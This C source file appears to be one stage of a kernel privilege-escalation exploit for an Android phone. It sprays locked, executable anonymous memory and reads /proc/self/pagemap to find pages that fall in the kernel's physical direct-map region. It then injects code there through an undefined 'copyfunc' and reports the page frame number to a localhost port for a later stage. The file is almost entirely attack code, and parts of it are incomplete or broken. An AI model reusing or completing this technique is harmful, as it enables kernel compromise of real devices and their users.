#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define MAP_SIZE 10*1024*1024 / getpagesize()
#define KERNEL_BOUNDARY 0x23080480 / getpagesize()
#define RAM_IOMEM_OFFSET 0x80000000 / getpagesize()
#define PAGE_ALLOC_MAX 55*1024*1024 / getpagesize() 
// basically my phone mounts ram at start address 0x80000000
#define PAGEMAP_ENTRY 8 //size of an entry of /proc/self/pagemap, the standard is 8 bytes
#define MAX_PIDS 20

typedef struct {
    unsigned int pfn; //32 bits is OK for my pagesize and ram
    unsigned int notused : 22; //not used
    unsigned short softDirty : 1;
    unsigned short exclusive : 1;
    unsigned short zero : 3;
    unsigned short shared : 1;
    unsigned short swapped : 1;
    unsigned short present : 1;
} PagemapEntry;
    
int readpagemap(unsigned long virt_addr, PagemapEntry* pe) {
   FILE * f;
   uint64_t file_offset;
   int status;
   int i;
   f = fopen("/proc/self/pagemap", "rb");
   if(!f){
      printf("Error! Cannot open %s\n", "/proc/self/map");
      printf("\t %s\n",strerror(errno));
      return -1;
   }

   file_offset = virt_addr / getpagesize() * PAGEMAP_ENTRY;
   //printf("Reading at 0x%llx\n",  (unsigned long long) file_offset);
   status = fseek(f, file_offset, SEEK_SET);
   if(status){
      perror("Failed to do fseek!");
      fclose(f);
      return -1;
   }

   fread(pe, sizeof(PagemapEntry),1,f);
   //printf(">>PFN: 0x%x present=%d swapped=%d\n",pe.pfn,pe.present,pe.swapped);
   fclose(f);
   return 0;
}

int printsz(int total) {
    int i = 0;
    const char* units[] = { "B", "kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"};
    double s = total * getpagesize();
    while ( s > 1000 ) {
        s /= 1000;
        i++;
    }
    printf("%.*f %s\n",i,s,units[i]);

}

void send_address(unsigned int pfn,unsigned int port) {
    int sockfd; // socket file descriptor
    struct sockaddr_in srv_addr; // client address
    char buf[256];

    srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
    srv_addr.sin_port = htons(port); // connect-back port, converted to network byte order
    srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order

    // create new TCP socket
    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

    // connect socket
    connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

    snprintf(buf,sizeof(buf),"%u\n",pfn);
    write(sockfd,buf,strlen(buf));
    
    close(sockfd);
}

void child(int fd) {
    unsigned int pfn = 0, ret = 0, rc = 0;
    int pages = 0, cntPresent = 0;
    void *vaddr, *addr;
    PagemapEntry pe;
    memset(&pe, 0x00, sizeof(PagemapEntry));
    char buf[256];

    while (pe.pfn <= 0) {
        addr = mmap(NULL, MAP_SIZE*getpagesize(), 
            PROT_READ | PROT_EXEC | PROT_WRITE, 
            MAP_SHARED | MAP_LOCKED | MAP_POPULATE | MAP_ANONYMOUS,
            -1, 0);

        ret = (int)addr;
        if (ret == -1) {
            break;
        }
        mlockall(MCL_CURRENT);

        for (pages = 0; pages < MAP_SIZE; pages++) {
            vaddr = addr+pages*getpagesize();
            rc = readpagemap((unsigned long)vaddr,&pe);
            if (rc < 0) {
                continue;
            }

            if (pe.present) {
                cntPresent++;
                memset(vaddr, 0x43, getpagesize());

                if (pe.pfn < RAM_IOMEM_OFFSET + KERNEL_BOUNDARY && 
                        pe.pfn > RAM_IOMEM_OFFSET) {
                    break;
                }
            }
            memset(&pe, 0x00, sizeof(PagemapEntry));
            vaddr = 0;
        }  

        printf("\t %p --> ",addr);
        printsz(cntPresent);

        if (pe.pfn || cntPresent >= PAGE_ALLOC_MAX) {
            break;
        }
    }

    if (pe.pfn) {
        copyfunc(pe.pfn,vaddr); //inject function
    }

    snprintf(buf,sizeof(buf),"%u\n",pe.pfn);
    write(fd,buf,strlen(buf));

    sleep(60000);
}

int main(int argc, char** argv) {
    pid_t pids[MAX_PIDS];
    int pidCount = 0;
    unsigned int pfn =0;
    int fd[2];
    char buf[256];
    void* vaddr;
    int i;
    int port_to_use = 0;

    if (argc <= 1) { return 1; }
    port_to_use = atoi(argv[1]);

    printf("Physmap region %d -> %d\n",
            RAM_IOMEM_OFFSET,
            KERNEL_BOUNDARY+RAM_IOMEM_OFFSET);

    while (pfn <= 0 && pidCount < MAX_PIDS) {
        pipe(fd);
        pids[pidCount] = fork();

        switch(pids[pidCount]) {
            case -1: {
                         perror("failed to fork");
                         exit(1);
                     }
            case 0: { /*child proc*/
                        close(fd[0]); //child closes (output fd)
                        child(fd[1]);
                    }
            default: { /*parent process*/
                         printf("Created Child %d\n",pids[pidCount]);
                         close(fd[1]); //parent closes (intput fd);
                         read(fd[0],buf,sizeof(buf));
                         sscanf(buf,"%d\n", &pfn);
                         fflush(stdout);
                     }
        }

        pidCount++;
    }

    printf("pfn injected %u\n", pfn);
    send_address(pfn, port_to_use);

    for (i = 0; i < pidCount-1; ++i) {
        printf("Reap child %d\n",pids[i]);
        fflush(stdout);
        kill(pids[i], SIGTERM); //kill process now, except latest
    }

    sleep(999);
    return;
}
